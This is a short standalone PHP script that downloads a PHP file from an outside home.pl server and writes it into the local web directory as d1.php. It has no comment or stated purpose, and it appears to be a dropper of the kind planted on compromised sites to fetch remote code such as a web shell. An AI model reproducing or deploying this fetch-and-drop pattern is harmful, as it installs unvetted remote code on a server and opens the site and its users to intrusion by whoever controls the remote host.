<?php
$file = 'http://serwer1769034.home.pl//z7/d1.php';
$newfile = 'd1.php';

if (!copy($file, $newfile)) {
    echo "failed to copy $file...\n";
}
?>